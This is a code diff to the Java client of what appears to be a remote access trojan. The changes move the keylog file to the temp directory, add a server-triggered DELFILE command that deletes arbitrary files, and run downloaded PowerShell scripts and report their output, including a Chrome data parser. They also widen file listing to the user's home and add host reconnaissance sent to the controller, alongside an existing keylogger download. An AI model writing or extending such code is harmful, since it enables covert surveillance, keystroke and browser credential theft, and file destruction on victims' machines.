@@ -37,7 +37,7 @@ public class Client {
     private static boolean keyLogger = false;
     private static String aesKey = "";
 
-    private static String keyLogFile = "";
+    private static String keyLogFile = System.getProperty("java.io.tmpdir") + "log.txt";
 
     private static String USERNAME = System.getProperty("user.name");
     private static String JRE_VERSION = System.getProperty("java.version");
@@ -132,7 +132,6 @@ public class Client {
             }
 
             // Start the keylogger if requested
-            keyLogFile = "log.txt";
             if (keyLogger){
                 if (SYSTEMOS.toLowerCase().contains("win")){
                     // Download psh keylogger
@@ -142,7 +141,7 @@ public class Client {
                     Runtime.getRuntime().exec(cmd);
                 }
             } else {
-                Files.write(Paths.get("log.txt"), "No keys available".getBytes());
+                Files.write(Paths.get(keyLogFile), "No keys available".getBytes());
             }
 
             while (true) {
@@ -201,6 +200,9 @@ public class Client {
                     String content = new String(Files.readAllBytes(Paths.get(keyLogFile)));
                     dos.writeInt(content.length());
                     communicate(content);
+                } else if (input.contains("DELFILE")){
+                    File x = new File(Arrays.copyOfRange(input.split(" "), 1, input.split(" ").length)[0]);
+                    x.delete();
                 } else if (input.contains("CLIPSET")) {
                     /*
                     SERVER: CLIPSET "data"
@@ -314,7 +316,7 @@ public class Client {
                         if (debugMode){ ioe.printStackTrace(); }
                     }
 
-                    String cmd = "powershell.exe -w hidden . " + fname;
+                    String cmd = "powershell.exe . " + fname;
                     if (debugMode){System.out.println("Command: " + cmd);}
                     // Run the command
                     // TODO: fix >> CLIENT SIDE << bug below
@@ -325,10 +327,17 @@ public class Client {
                     ProcessBuilder builder = new ProcessBuilder(cmd.split(" "));
                     builder.redirectErrorStream(true);
                     Process proc = builder.start();
+
+                    BufferedReader termOutput = new BufferedReader(new
+                            InputStreamReader(proc.getInputStream()));
+                    String firstLine = termOutput.readLine();
+                    if (firstLine.contains("Cannot parse Data files while chrome is running"))
+                        communicate(firstLine);
                     // Read file
                     BufferedReader stdInput = new BufferedReader(new FileReader(outFile));
                     String s = null;
                     while ((s = stdInput.readLine()) != null){
+                        System.out.println("In while");
                         communicate(s);
                         if (debugMode){System.out.println("Got line: " + s);}
                     }
@@ -579,7 +588,7 @@ public class Client {
 
     private void sendFileList() throws IOException{
         if (directory == null) {
-            String directory = System.getProperty("user.home") + "/Downloads/";
+            String directory = System.getProperty("user.home");
             Client.directory = new File(directory);
             Client.directory.isDirectory();
         }
@@ -667,13 +676,28 @@ public class Client {
         sb.append("Architecture: " + ARCH + "\n");
         sb.append("Encryption key: " + aesKey + "\n");
         sb.append("CPU: " + System.getenv("PROCESSOR_IDENTIFIER") + "\n");
-        sb.append("  - Num. CPU Cores: " + System.getenv("NUMBER_OF_PROCESSORS") + "\n");
+        sb.append("  - CPU Cores: " + Runtime.getRuntime().availableProcessors() + "\n");
         try {
             InetAddress inetAddress = InetAddress.getLocalHost();
             sb.append("LAN IP: " + inetAddress.getHostAddress() + "\n");
             sb.append("Hostname: " + inetAddress.getHostName() + "\n");
         } catch (IOException ioe){}
         sb.append("$PATH: " + System.getenv("PATH") + "\n");
+        sb.append("Free memory (bytes): " + Runtime.getRuntime().freeMemory() + "\n");
+        long maxMemory = Runtime.getRuntime().maxMemory();
+        sb.append("Max memory (bytes): " + (maxMemory == Long.MAX_VALUE ? "no limit" : maxMemory) + "\n");
+        sb.append("Available JVM memory (bytes): " + Runtime.getRuntime().totalMemory() + "\n");
+
+        File[] roots = File.listRoots();
+
+        /* For each filesystem root, print some info */
+        for (File root : roots) {
+            sb.append("File system root: " + root.getAbsolutePath() + "\n");
+            sb.append("Total space (bytes): " + root.getTotalSpace() + "\n");
+            sb.append("Free space (bytes): " + root.getFreeSpace() + "\n");
+            sb.append("Usable space (bytes): " + root.getUsableSpace() + "\n");
+        }
+
         communicate(sb.toString());
     }
 
